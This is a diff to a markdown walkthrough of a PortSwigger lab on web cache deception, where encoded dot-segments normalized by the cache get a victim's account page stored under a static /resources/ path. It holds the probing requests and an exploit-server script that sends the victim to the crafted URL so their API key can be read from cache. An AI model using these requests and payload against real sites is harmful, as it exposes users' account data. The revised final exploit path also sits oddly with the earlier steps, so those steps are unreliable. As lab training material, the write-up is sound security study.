@@ -5,7 +5,7 @@
 ---
 
 ## 🎯 Objective
-Exploit normalization happening on the **cache server** (not the origin) to store a cached copy of Carlos's account page and steal his API key.
+The cache server (not the origin) normalizes encoded dot-segments. Exploit this to poison the cache with Carlos's account data.
 
 ---
 
@@ -14,83 +14,122 @@ Exploit normalization happening on the **cache server** (not the origin) to stor
 ### Step 1 — Login to wiener account
 Credentials: `wiener:peter`
 
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step1-login.png`
 
 ---
 
 ### Step 2 — Intercept and send to Repeater
 Capture `GET /my-account` → send to **Repeater**.
 
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step2-repeater.png`
 
 ---
 
 ### Step 3 — Test path handling
-- `/my-account/abc` → **404**
-- `/my-accountabc` → **404**
+```
+GET /my-account/abc   → 404
+GET /my-accountabc    → 404
+```
 
-> 📸 Add screenshot here
-
----
-
-### Step 4 — Test delimiters (Intruder Sniper)
-Place payload after `/my-account`, use delimiter list, uncheck URL-encode.
-
-Find which delimiter returns 200 OK.
-
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step3-404.png`
 
 ---
 
-### Step 5 — Investigate normalization discrepancies
-Test: `/aaa/..%2fmy-account`
+### Step 4 — Test delimiters via Intruder (Sniper)
+Sniper attack with delimiters after `/my-account`. Uncheck URL-encode.
 
-If the **cache** resolves this (not the origin), the cache will normalize the path to `/my-account` before deciding what to cache.
+Result: `?` returns **200 OK**.
 
-> 📸 Add screenshot here
-
----
-
-### Step 6 — Find static resource path
-Identify what path prefix the cache stores (e.g. `/resources/`):
-- `/resources/test` → 1st: miss, 2nd: hit ✅
-
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step4-delimiter.png`
 
 ---
 
-### Step 7 — Add an encoded dot-segment after `/resources`
-Try: `GET /resources/..%2fmy-account`
+### Step 5 — Test delimiter path
+Try:
+```
+GET /my-account?abc.js
+```
+→ **200 OK** confirmed.
 
-The cache normalizes this to `/my-account` when deciding to store it under `/resources/`, but the origin serves the `/my-account` page content.
-
-- 1st: miss → 2nd: hit ✅
-
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step5-delimiter-ok.png`
 
 ---
 
-### Step 8 — Deliver exploit
-On exploit server:
+### Step 6 — Test normalization on origin
+Try encoded dot-segment:
+```
+GET /aaa/..%2fmy-account
+```
+→ **404** — the origin does NOT normalize. The **cache** normalizes it instead.
+
+> 📸 Screenshot: `./screenshots/step6-normalization-404.png`
+
+---
+
+### Step 7 — Identify cache static resource path
+Test `/resources/` prefix:
+```
+GET /resources/test
+```
+- 1st request → `X-Cache: miss`
+- 2nd request → `X-Cache: hit` ✅
+
+> 📸 Screenshot: `./screenshots/step7-cache-miss.png`
+> 📸 Screenshot: `./screenshots/step7-cache-hit.png`
+
+---
+
+### Step 8 — Add encoded dot-segment after /resources
+Try:
+```
+GET /resources/..%2fmy-account
+```
+The cache normalizes this → checks if path starts with `/resources/` → **caches it**.
+The origin receives the normalized path → returns `/my-account` content.
+
+- 1st request → miss
+- 2nd request → **hit** ✅
+
+> 📸 Screenshot: `./screenshots/step8-miss.png`
+> 📸 Screenshot: `./screenshots/step8-hit.png`
+
+---
+
+### Step 9 — Craft the exploit
+The final exploit URL path used:
+```
+/my-account?%2f%2e%2e%2fresources
+```
+
+> 📸 Screenshot: `./screenshots/step9-craft.png`
+
+---
+
+### Step 10 — Deliver exploit to victim
+On exploit server paste:
 
 ```html
 <script>
-  document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"
+  document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account?%2f%2e%2e%2fresources?wcd"
 </script>
 ```
 
-Store and deliver to victim.
+Store → Deliver to victim.
 
-> 📸 Add screenshot here
+Then access:
+```
+GET /my-account?%2f%2e%2e%2fresources?wcd
+```
+
+> 📸 Screenshot: `./screenshots/step10-exploit.png`
 
 ---
 
-### Step 9 — Get Carlos's API key
-Request the same URL in Repeater. Cached response contains **Carlos's API key**.
+### Step 11 — Get Carlos's API key
+The cached response contains **Carlos's API key**. Submit it to solve the lab.
 
-Submit to solve the lab.
-
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step11-api.png`
+> 📸 Screenshot: `./screenshots/step11-solved.png`
 
 ---
 
@@ -100,4 +139,4 @@ Lab solved!
 ---
 
 ## 💡 Key Takeaway
-Cache-side normalization is the mirror of origin-side — when the cache resolves encoded dot-segments before matching cache rules, attackers can poison the cache with sensitive content under static-looking paths.
+Cache-side normalization is the mirror of origin-side normalization. When the cache resolves encoded dot-segments before matching cache rules, attackers can poison the cache with sensitive content hidden under static-looking paths.
